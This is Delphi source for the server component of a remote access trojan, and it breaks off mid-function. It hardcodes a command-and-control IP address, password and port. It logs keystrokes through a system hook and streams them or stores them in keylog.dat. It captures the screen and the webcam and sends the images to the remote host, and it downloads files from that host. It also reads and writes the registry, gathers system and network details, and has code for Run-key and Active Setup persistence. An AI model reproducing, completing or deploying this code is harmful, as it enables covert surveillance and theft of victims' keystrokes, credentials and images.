program Server;

uses
  Windows,
  Winsock,
  untCMDList,
  ShellApi,
  psApi,
  SHFolder,
  TLHelp32,
  ZLib,
  graphics,
  untScreenShot in 'untScreenShot.pas',
  classes;
const
  faReadOnly  = $00000001;
  faHidden    = $00000002;
  faSysFile   = $00000004;
  faVolumeID  = $00000008;
  faDirectory = $00000010;
  faArchive   = $00000020;
  faAnyFile   = $0000003F;

Type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;


  TInfo = Record
    Name        :String;
    Host        :String;
    Port        :Integer;
    Size        :Integer;
    FileSize    :Cardinal;
    Mutex       :Integer;
    SShot:extended;
    sFile:string;
    sScreenshotStringz:string;
  End;
  PInfo = ^TInfo;

  TServer = Class(TObject)
  Private
    Sock        :TSocket;
    Addr        :TSockAddrIn;
    WSA         :TWSAData;
  Public
    Procedure Connect;
    Procedure SendData(Text: String);
    Procedure ReceiveData;
  End;

var
  Serv          :TServer;
  Info          :TInfo;
  Close         :Boolean;
  LastDir       :String;
  host          : string = '79.218.148.122';
  password      : string = 'password';
  port          : integer = 1005;
  Msg:TMsg;
  installdir:string;
  sKeyloggerThread:Cardinal;
  installFilename:string;
  HKCUStartup:string;
  ActiveXStartup:string;
  Hookhandle:Cardinal;
  ss:string;
  sInstallParams:Array[0..100]of String;
  sSettings:string;
  sInstallme:Boolean;
  sStartupme:Boolean;
  sHCKUStart:Boolean;
  sActiveX:Boolean;
  sKeylogger:Boolean;
  sMelt:Boolean;
  sUnHook:boolean;
  sHandleMutex:Cardinal;
function InternetGetConnectedStateEx(
    lpdwFlags: LPDWORD;
    lpszConnectionName: LPTSTR;
    dwNameLen: DWORD;
    dwReserved: DWORD): BOOL; stdcall;
    external 'wininet.dll' name 'InternetGetConnectedStateEx';

Function StrToInt(Const S: String): Integer;
Var E: Integer; Begin Val(S, Result, E); End;

Function IntToStr(Const Value: Integer): String;
Var S: String[11]; Begin Str(Value, S); Result := S; End;
function StrScan(const Str: PChar; Chr: Char): PChar;
begin
  Result := Str;
  while Result^ <> Chr do
  begin
    if Result^ = #0 then
    begin
      Result := nil;
      Exit;
    end;
    Inc(Result);
  end;
end;
function GetCurrentDir: string;
begin
  GetDir(0, Result);
end;
Function ResolveIP(HostName: String): String;
Type
  tAddr = Array[0..100] Of PInAddr;
  pAddr = ^tAddr;
Var
  I             :Integer;
  WSA           :TWSAData;
  PHE           :PHostEnt;
  P             :pAddr;
Begin
  Result := '';

  WSAStartUp($101, WSA);
    Try
      PHE := GetHostByName(pChar(HostName));
      If (PHE <> NIL) Then
      Begin
        P := pAddr(PHE^.h_addr_list);
        I := 0;
        While (P^[I] <> NIL) Do
        Begin
          Result := (inet_nToa(P^[I]^));
          Inc(I);
        End;
      End;
    Except
    End;
  WSACleanUp;
End;
Function AppendFile(pText: String): boolean;
Var
  FileHandle      : THandle;
  BW              : Cardinal;
  Len             : Cardinal;
Begin
  Result := False;
  FileHandle := CreateFile(pChar(GetCurrentDir + '\keylog.dat'), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  If FileHandle = INVALID_HANDLE_VALUE Then Exit;
  SetFilePointer(FileHandle, 0, NIL, FILE_END);
  Len := Length(pText);
  WriteFile(FileHandle, pText[1], Len, BW, NIL);
  CloseHandle(FileHandle);
  If (BW = Len) Then Result := True;
End;
function JHProc(nCode:integer; wParam: Longint; var EventStrut: TEVENTMSG): Longint; stdcall;
var
 szletta:string;
 szCurAppNm:array[0..260] of Char;
 Charry:Array[0..1] of Char;
 VirtKey,ScanCode:Cardinal;
 KeyState:TKeyBoardState;
 nametext:Array[0..32] of Char;
begin
 if (nCode = HC_ACTION) and (EventStrut.message = $0100)
  then begin
   VirtKey:=LOBYTE(EventStrut.paramL);
   ScanCode:=HIBYTE(EventStrut.paramL);
   ScanCode:=ScanCode shl 16;
   GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
    if ss <> szCurAppNm then begin
      ss := szCurAppNm;
      if Hookhandle = 0 then begin
        AppendFile(#13 + #10 + #13 +#10 + szletta + #13 + #10);
      end else begin
        szletta := '33|' + '[ ' + szCurAppNm + ']' + #10;
        send(Serv.Sock,szletta[1],Length(szletta),0);
      end;
   end;
   GetKeyNameText(ScanCode,nametext,sizeof(nametext));
   if VirtKey = VK_CAPITAL then szletta:=#0
   else if VirtKey = VK_SHIFT then szletta:='[Shift]'
   else if VirtKey = VK_SPACE then szletta:='[Space]'
   else if lstrlen(nametext) > 1 then szletta:='['+nametext+']'
   else
    begin
     GetKeyboardState(KeyState);
     ToAscii(VirtKey,ScanCode, KeyState, Charry, 0);
     szletta:=Charry;
    end;
    if Hookhandle = 0 then begin
      AppendFile(szletta);
    end else begin
      szletta := '32|' + szletta + #10;
      send(Serv.Sock,szletta[1],Length(szletta),0);
    end;
   //if szletta <> '' then WriteFile(hFile, pchar(szletta)^, length(szletta), BytesWritten, nil);
   //CloseHandle(hFile);

  end;
 CallNextHookEx(HookHandle, nCode, wParam, Integer(@EventStrut));
 Result:=0;
end;
function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;
function HexToInt(s: string): longword;
var
  b: byte;
  c: char;
begin
  Result := 0;
  s      := UpperCase(s);
  for b := 1 to Length(s) do
  begin
    Result := Result * 16;
    c      := s[b];
    case c of
      '0'..'9': Inc(Result, Ord(c) - Ord('0'));
      'A'..'F': Inc(Result, Ord(c) - Ord('A') + 10);
    end;
  end;
end;

function ToKey(Clave: String):HKEY;
begin
  if Clave='HKEY_CLASSES_ROOT' then
    Result:=HKEY_CLASSES_ROOT
  else if Clave='HKEY_CURRENT_CONFIG' then
    Result:=HKEY_CURRENT_CONFIG
  else if Clave='HKEY_CURRENT_USER' then
    Result:=HKEY_CURRENT_USER
  else if Clave='HKEY_LOCAL_MACHINE' then
    Result:=HKEY_LOCAL_MACHINE
  else if Clave='HKEY_USERS' then
    Result:=HKEY_USERS
  else
    Result:=0;
end;

function LastDelimiter(const Delimiters, S: string): Integer;
begin
  Result := Length(S);
  while Result > 0 do
  begin
    if (S[Result] <> #0) then begin
      if (s[result] = Delimiters) then Exit;
    end;
    Dec(Result);
  end;
end;

function AniadirClave(Clave, Val, Tipo: String):boolean;
var
  phkResult: HKEY;
  Valor: String;
  ClaveBase: String;
  Cadena: String;
  binary: Array of Byte;
  i: integer;
begin
  ClaveBase := Copy(Clave, 1, Pos('\', Clave) - 1);
  Delete(Clave, 1, Pos('\', Clave));
  Valor := Copy(Clave, LastDelimiter('\', Clave) + 1, Length(Clave));
  Delete(Clave, LastDelimiter('\', Clave), Length(Clave));
  if Tipo = 'clave' then
  begin
    RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_CREATE_SUB_KEY, phkResult);
    Result := (RegCreateKey(phkResult, PChar(Valor), phkResult) = ERROR_SUCCESS);
    RegCloseKey(phkResult);
    Exit;
  end;
  if RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
  begin
    if Tipo = 'REG_SZ' then
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_SZ, Pchar(Val), Length(Val)) = ERROR_SUCCESS);
    if Tipo = 'REG_BINARY' then
    begin
      if Val[Length(Val)] <> ' ' then Val := Val + ' ';
      Cadena := Val;
      i := 0;
      SetLength(binary, Length(Cadena) div 3);
      while Cadena <> '' do
      begin
        binary[i] := HexToInt(Copy(Cadena, 0, Pos(' ', Cadena) - 1));
        Delete(Cadena, 1, Pos(' ', Cadena) + 1);
        inc(i);
      end;
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_BINARY, @binary[0], Length(binary)) = ERROR_SUCCESS);
    end;
    if Tipo = 'REG_DWORD' then
    begin
      i := StrToInt(Val);
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_DWORD, @i, sizeof(i)) = ERROR_SUCCESS);
    end;
    if Tipo = 'REG_MULTI_SZ' then
    begin
      while Pos(#13#10, Val) > 0 do
        Val:=Copy(Val, 1, Pos(#13#10, Val) - 1) + #0+
                  Copy(Val, Pos(#13#10, Val) + 2, Length(Val));
      Val := Val + #0#0;
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_MULTI_SZ, PChar(Val), Length(Val)) = ERROR_SUCCESS);
    end;
    RegCloseKey(phkResult);
  end
  else
    Result := False;
end;





Function Readkeylogger: String;
Var
  FileHandle      : THandle;
  Buffer          : Pointer;
  Buffer2         : String;
  BytesRead       : Cardinal;
  Size            : Integer;
Begin
  FileHandle := CreateFile(pChar(GetCurrentDir + '\keylog.dat'), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_ALWAYS	, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_OVERLAPPED);
  Try
    Size := GetFileSize(FileHandle, NIL);
    GetMem(Buffer, Size);
    ReadFile(FileHandle, Buffer^, Size, BytesRead, NIL);
    SetLength(Buffer2, Bytesread);
    Move(Buffer^, Buffer2[1], BytesRead);
    FreeMem(Buffer);
  Finally
    CloseHandle(FileHandle);
  end;
  Result := Buffer2;
End;


//thx to wack-a-mole
function ReadSettings(var Settings: string): boolean;
var
  hResInfo: HRSRC;
  hRes:     HGLOBAL;
  tChar:PChar;
begin
  Result   := False;
  hResInfo := FindResource(hInstance, 'CFG', RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      tChar := LockResource(hRes);
      settings := PChar(tChar);
      SetLength(Settings,SizeOfResource(HInstance, HResInfo));
      Result   := True;
    end;
  end;
end;

Procedure SetDelValue(ROOT: hKey; Path, Value: String);
Var
  Key   :hKey;
  Size  :Cardinal;
Begin
  RegOpenKey(ROOT, pChar(Path), Key);
  Size := 2048;
  RegDeleteValue(Key, pChar(Value));
  RegCloseKey(Key);
End;
function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;

Function GetUserFromWindows: string;
Var
   UserName : string;
   UserNameLen : Dword;
Begin
   UserNameLen := 255;
   SetLength(userName, UserNameLen) ;
   If GetUserName(PChar(UserName), UserNameLen) Then
     Result := Copy(UserName,1,UserNameLen - 1)
   Else
     Result := 'Unknown';
End;

Procedure Uninstall;
Begin
  if sHCKUStart = true then SetDelValue(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',HKCUStartup);
  if sActiveX = true then SetDelValue(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup, 'StubPath');
  ExitProcess(0);
End;

Function Enumeration(dRes: PNetResource; dI: Integer): String;
Var
  dHandle       :THandle;
  K             :DWord;
  BufferSize    :DWord;
  Buffer        :Array[0..1023] Of TNetResource;
  I             :Word;
  Temp          :String;
Begin
  WNetOpenEnum(2, 0, 0, dRes, dHandle);

  K := 1024;
  BufferSize := SizeOf(Buffer);

  While (WNetEnumResource(dHandle, K, @Buffer, BufferSize) = 0) Do
    For I := 0 To K - 1 Do
    Begin
      If (Buffer[I].dwDisplayType = RESOURCEDISPLAYTYPE_SERVER) Then
      Begin
        Temp := IntToStr(C_INFONETWORK) + ' ' + pChar(Buffer[I].lpRemoteName) + ' "' + pChar(Buffer[I].lpComment) + '"'#10;
        If (Pos(Temp, Result) = 0) Then
          Result := Result + Temp;
      End;
      If (Buffer[I].dwUsage > 0) Then
      Begin
        Temp := Enumeration(@Buffer[I], 1);
        If (Pos(Temp, Result) = 0) Then
          Result := Result + Temp;
      End;
    End;

  WNetCloseEnum(dHandle);
End;

Function GetNetworkInfo: String;
Begin
  Result := IntToStr(C_INFONETWORK) + ' Domains Comments'#10 +
            Enumeration(NIL, 0);
End;

Function GetServerInfo: String;
Begin
  Result := IntToStr(C_INFOSERVER) + ' Version ' + Version + #10 +
            IntToStr(C_INFOSERVER) + ' Address ' + Host + #10 +
            IntToStr(C_INFOSERVER) + ' Password ' + Password + #10 +
            IntToStr(C_INFOSERVER) + ' Port ' + IntToStr(Port) + #10;
End;

Function GetInformation: String;
Var
  HostName      :Array[0..069] Of Char;
  Sysdir        :Array[0..255] Of Char;
  MemoryStatus  :TMemoryStatus;
  Total         :Integer;
Begin
  GetHostName(HostName, SizeOf(HostName));
  GetSystemDirectory(Sysdir, 256);

  MemoryStatus.dwLength := SizeOf(TMemoryStatus);
  GlobalMemoryStatus(MemoryStatus);

  Total := GetTickCount() DIV 1000;

  Result := IntToStr(C_INFOSYSTEM) + ' Hostname ' + Hostname + #10 +
            IntToStr(C_INFOSYSTEM) + ' System ' + String(SysDir) + #10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Total) ' + IntToStr(MemoryStatus.dwTotalPhys DIV 1048576) + ' MB Total'#10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Free) ' + IntToStr(MemoryStatus.dwAvailPhys DIV 1048576) + ' MB Free'#10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Used) ' + IntToStr(MemoryStatus.dwMemoryLoad) + '% In Use'#10+
            IntToStr(C_INFOSYSTEM) + ' Uptime ' + IntToStr(Total DIV 86400) + ' days ' +
                                                  IntToStr((Total MOD 86400) DIV 3600) + ' hours ' +
                                                  IntToStr(((Total MOD 86400) MOD 3600) DIV 60) + ' min ' +
                                                  IntToStr((((Total MOD 86400) MOD 3600) MOD 60) DIV 1) + ' sec'#10;
End;


// Send Data
Function SendData(Sock: TSocket; Text: String; VAR sByte: Cardinal): Integer;
Var
  Len: Integer;
Begin
  Result := Length(Text);
  Len := Send(Sock, Text[1], Length(Text), 0);
  Inc(sByte, Len);
End;
Procedure SplitSettings(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  I := 0;
  While (Pos('##', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos('##', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos('##', Text) + 1);
    If (I >= 100) Then Break;
  End;
End;
Procedure StripOutCmd(Text: String; VAR Cmd: String);
Begin Cmd := Copy(Text, 1, Pos('|', Text)-1); End;

Procedure StripOutParam(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  Delete(Text, 1, Pos('|', Text));

  If Text = '' Then Exit;
  If (Text[Length(Text)] <> '|') Then Text := Text + '|';

  I := 0;
  While (Pos('|', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos('|', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos('|', Text));
    If (I >= 100) Then Break;
  End;
End;

Function FileExists(Const FileName: String): Boolean;
Var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;

procedure CvtInt;
asm
        OR      CL,CL
        JNZ     @CvtLoop
@C1:    OR      EAX,EAX
        JNS     @C2
        NEG     EAX
        CALL    @C2
        MOV     AL,'-'
        INC     ECX
        DEC     ESI
        MOV     [ESI],AL
        RET
@C2:    MOV     ECX,10

@CvtLoop:
        PUSH    EDX
        PUSH    ESI
@D1:    XOR     EDX,EDX
        DIV     ECX
        DEC     ESI
        ADD     DL,'0'
        CMP     DL,'0'+10
        JB      @D2
        ADD     DL,('A'-'0')-10
@D2:    MOV     [ESI],DL
        OR      EAX,EAX
        JNE     @D1
        POP     ECX
        POP     EDX
        SUB     ECX,ESI
        SUB     EDX,ECX
        JBE     @D5
        ADD     ECX,EDX
        MOV     AL,'0'
        SUB     ESI,EDX
        JMP     @z
@zloop: MOV     [ESI+EDX],AL
@z:     DEC     EDX
        JNZ     @zloop
        MOV     [ESI],AL
@D5:
end;
function IntToHex(Value: Integer; Digits: Integer): string;
//  FmtStr(Result, '%.*x', [Digits, Value]);
asm
        CMP     EDX, 32        // Digits < buffer length?
        JBE     @A1
        XOR     EDX, EDX
@A1:    PUSH    ESI
        MOV     ESI, ESP
        SUB     ESP, 32
        PUSH    ECX            // result ptr
        MOV     ECX, 16        // base 16     EDX = Digits = field width
        CALL    CvtInt
        MOV     EDX, ESI
        POP     EAX            // result ptr
        CALL    System.@LStrFromPCharLen
        ADD     ESP, 32
        POP     ESI
end;
function ListarValues(Clave: String): String;
var
  phkResult: HKEY;
  dwIndex, lpcbValueName, lpcbData: Cardinal;
  lpData: PChar;
  lpType: DWORD;
  lpValueName: PChar;
  strTipo, strDatos, Nombre: String;
  j, Resultado: integer;
  DValue: PDWORD;
  Temp:string;
begin
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)),
               PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))),
               0, KEY_QUERY_VALUE, phkResult);
  dwIndex := 0;
  GetMem(lpValueName, 16383); //Longitud máxima del nombre de un valor: 16383
  Resultado := ERROR_SUCCESS;
  while (Resultado = ERROR_SUCCESS) do
  begin
    //Se guarda en lpcbData el tamaño del valor que vamor a leer
    RegEnumValue(phkResult, dwIndex, lpValueName, lpcbValueName, nil, @lpType, nil, @lpcbData);
    //Reservamos memoria
    GetMem(lpData, lpcbData);
    lpcbValueName := 16383;
    //Y ahora lo leemos
    Resultado := RegEnumValue(phkResult, dwIndex, lpValueName, lpcbValueName, nil, @lpType, PByte(lpData), @lpcbData);
    if Resultado = ERROR_SUCCESS then
    begin
      strDatos := '';
      if lpType = REG_DWORD  then
      begin
        DValue := PDWORD(lpData);
        strDatos := '0x'+ IntToHex(DValue^, 8) + ' (' + IntToStr(DValue^) + ')'; //0xHexValue (IntValue)
      end
      else
        if lpType = REG_BINARY then
        begin
          if lpcbData = 0 then
            strDatos := '(No Data)'
          else
            for j := 0 to lpcbData - 1 do
              strDatos:=strDatos + IntToHex(Ord(lpData[j]), 2) + ' ';  //4D 5A 00 10
        end
        else
          if lpType = REG_MULTI_SZ then
          begin
            for j := 0 to lpcbData - 1 do
              if lpData[j] = #0 then  //Fin de una cadena múltiple
                lpData[j] := ' ';
            strDatos := lpData;
          end
          else  //En caso de no ser DWORD, BINARY o MULTI_SZ copiar tal cual
            strDatos := lpData;
      if lpValueName[0] = #0 then //Primer caracter = fin de linea, cadena vacía
        Nombre := '(End)'
      else
        Nombre := lpValueName;
      case lpType of
        REG_BINARY: strTipo := 'REG_BINARY';
        REG_DWORD: strTipo := 'REG_DWORD';
        REG_DWORD_BIG_ENDIAN: strTipo := 'REG_DWORD_BIG_ENDIAN';
        REG_EXPAND_SZ: strTipo := 'REG_EXPAND_SZ';
        REG_LINK: strTipo := 'REG_LINK';
        REG_MULTI_SZ: strTipo := 'REG_MULTI_SZ';
        REG_NONE: strTipo := 'REG_NONE';
        REG_SZ: strTipo := 'REG_SZ';
      end;
      if strDatos = '' then strdatos := ' ';
      Temp := Temp + '|' + Nombre + '#' + strTipo + '#' + strDatos;
      Inc(dwIndex);
    end;
  end;
  RegCloseKey(phkResult);
  Temp := IntToStr(36) + Temp + #10;
  Send(Serv.Sock, Temp[1], Length(Temp), 0);
end;


Function RecvFile(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  F             :File;
  Buf           :Array[0..8192] Of Char;
  dErr          :Integer;
  Name          :String;
  Host          :String;
  sFilez        :string;
  Port          :Integer;
  recvsize      :integer;
  Size          :Integer;
  T             :String;
Begin
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  Size := PInfo(P)^.Size;
  sFilez := Pinfo(p)^.sFile;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
    T := '40|' + sFilez + '|' + IntToStr(Size) + #10;
    send(Sock,t[1],Length(t),0);
    Sleep(1000);
    {$I-}
    T := 'ok';
    recvsize := 1;
    AssignFile(F, Name);
    Rewrite(F, 1);
    Repeat
      FillChar(Buf, SizeOf(Buf), 0);
      dErr := Recv(Sock, Buf, SizeOf(Buf), 0);
      if dErr = -1 then Break;
      if Size < (derr + recvsize) then begin
        BlockWrite(F, Buf, Size - recvsize + 1);
        Inc(recvsize, derr);
      end else begin
        Inc(recvsize, dErr);
        BlockWrite(F, Buf, derr);
      end;
      dErr := Send(Sock, T[1], Length(T), 0);
      if dErr = -1 then Break;
    Until recvsize >= Size;
    CloseFile(F);
    {$I+}

End;
Function GetFileSize(FileName: String): Int64;
Var
  H     :THandle;
  Data  :TWIN32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), Data);
  If (H <> INVALID_HANDLE_VALUE) Then
  Begin
    Windows.FindClose(H);
    Result := Int64(Data.nFileSizeHigh) SHL 32 + Data.nFileSizeLow;
  End;
End;
function ListarClaves(Clave: String): String;
var
  phkResult: HKEY;
  lpName: PChar;
  lpcbName, dwIndex: Cardinal;
  lpftLastWriteTime: FileTime;
  Temp:string;
begin
  Temp := '';
  //Clave vale algo así: HKEY_LOCAL_MACHINE\SOFTWARE\
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)), //ToKey(HKEY_LOCAL_MACHINE)
               PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))), //SOFTWARE\
               0,
               KEY_ENUMERATE_SUB_KEYS,  //Los permisos justos y necesarios
               phkResult);
  lpcbName := 255; //Size limit of Key name 255 characters
  GetMem(lpName, lpcbName);
  dwIndex := 0;
  while RegEnumKeyEx(phkResult, dwIndex, @lpName[0] , lpcbName, nil, nil, nil, @lpftLastWriteTime) = ERROR_SUCCESS do
  begin
    //DateTimeToStr(FileTime2DateTime(lpftLastWriteTime));  //Nos da la fecha de última modificación de la clave, algo muy útil pero no sé donde mostrarlo
    temp := temp + lpName + '|';
    Inc(dwIndex);
    lpcbName := 255;
  end;
  RegCloseKey(phkResult);
  Temp := IntToStr(35) + '|' + Temp + #10;
  Send(Serv.Sock, Temp[1], Length(Temp), 0);
end;
function komprimiere(input:TStream):tmemorystream;
var
  xx: TCompressionStream;
begin
   result := tmemorystream.create;
   xx := TCompressionStream.Create(clFastest,result);
   xx.CopyFrom(input, input.Size);
   Sleep(1);
   xx.Free;
   result.position:=0;
end;
Function SendWebcam(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  bmp:TBitmap;
  BytesRead     :Cardinal;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  T             :String;
  Mutex         :integer;
  pf,df:tmemorystream;
Begin
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  bmp := tbitmap.Create;
  bmp.Handle := GetBitmapFromWebcam;
  bmp.Dormant;
  df := tmemorystream.Create;
  pf := TMemoryStream.Create;
  bmp.SaveToStream(df);
  df.Position := 0;
  pf := komprimiere(df);
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(C_WEBCAM) + '|1|'+inttostr(pf.Size)+'|' + IntToStr(mutex) + '|' + #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    pf.Position := 0;
    Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    pf.Free;
    bmp.Free;
    df.Free; 
    {$I+}
End;
procedure StringToStream(AString: string; ADest: TStream);
// Takes a string and appends it to a stream.
var len: longint;
begin
  len := Length(AString);
  ADest.WriteBuffer(len, SizeOf(len));
  ADest.WriteBuffer(AString[1], len);
end;

Function  StreamToString(AStream: TStream): String;
Begin
  SetLength(Result, AStream.Size);
  AStream.Position := 0;
  AStream.ReadBuffer(Result[1], AStream.Size);
End;
Function SendScreenShotN(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  bmp:TBitmap;
  BytesRead     :Cardinal;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  Mutex         :integer;
  ccs:extended;
  x,y:integer;
  pf,fk:TMemoryStream;
Begin
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  ccs := pinfo(p)^.SShot;
  filesize := pinfo(p)^.Size;
  bmp := tbitmap.Create;
  bmp.Handle := CaptureWND(0,ccs,16,x,y);
  bmp.Dormant;
  pf := tmemorystream.Create;
  fk := TMemoryStream.Create;
  bmp.SaveToStream(fk);
  fk.Position := 0;
  pf := komprimiere(fk);
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(C_SCREENN) + '|1|'+inttostr(pf.Size)+'|' + IntToStr(mutex) + '|' + #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    pf.Position := 0;
    Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    pf.Free;
    bmp.Free;
    fk.Free;
    {$I+}
End;
Function SendScreenShot(P: Pointer): DWord; STDCALL;
Var
  Socku          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Bufs           :Array[0..4000] Of Char;
  Buf           :Array[0..1000] Of Char;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  Mutex         :integer;
  sDat:string;
  data:string;
  ccs:extended;
  Len:Integer;
  MyFirstBmp,MySecondBmp,MyCompareBmp,PackStream:TMemoryStream;
Begin
  sDat := '';
  PackStream := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  MyFirstBmp := TMemoryStream.Create;
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  ccs := pinfo(p)^.SShot;
  filesize := pinfo(p)^.Size;
  //sendStri := pinfo(p)^.sScreenshotStringz;
  WSAStartUp($0101, WSA);
  Socku := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Socku, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(C_SCREEN) + '|' + IntToStr(mutex)  + #10;
  send(socku, t[1],length(T),0);
  repeat
    Len := Recv(socku, Buf, SizeOf(Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(Buf);
    ZeroMemory(@Buf, SizeOf(Buf));
    sDat := sDat + data;
    if Copy(sDat,Length(sdat),1) = #10 then begin
      if Copy(sDat,1,2) = 'ST' then begin
        OutputDebugString(pchar('ST' + ' = ' + sdat));
        GetScreenToBmp(False,MyFirstBmp);
        MyFirstBmp.Position:=0;
        PackStream := komprimiere(MyFirstBmp);
        packstream.position := 0;
        T := 'SI' + inttostr(PackStream.size);
        Send(Socku, T[1], Length(t), 0);
      end;
      if Copy(sDat,1,2) = 'GT' then begin
        OutputDebugString(pchar('GT' + ' = ' + sdat));
        CompareStream(MyFirstBmp,MySecondBmp,MyCompareBmp);
        MyCompareBmp.Position:=0;
        PackStream := komprimiere(MyCompareBmp);
        PackStream.Position := 0;
        T := 'GI' + inttostr(PackStream.size) ;
        Send(Socku, T[1], Length(t), 0);
      end;
      if Copy(sDat,1,2) = 'OK' then begin
        PackStream.Position := 0;
        T := 'OL';
        Send(Socku, T[1], Length(T), 0);
        Sleep(10);
        Repeat
          bytesread := PackStream.Read(Bufs, SizeOf(Bufs));
          If (BytesRead = 0) Then Break;
          Send(Socku, Bufs[0], SizeOf(Bufs), 0);
          FillChar(Buf, SizeOf(Buf), 0);
          Recv(Socku, Bufs, SizeOf(Bufs), 0);
        Until BytesRead = 0;
        //T := #10;
        //Send(Socku, T[1], Length(T), 0);
      end;
      sDat := '';
    end;

  {StringToStream(sendStri,pf);
  pf.Position := 0;
  pf.SaveToFile('C:\har.bmp');
  {$I-}
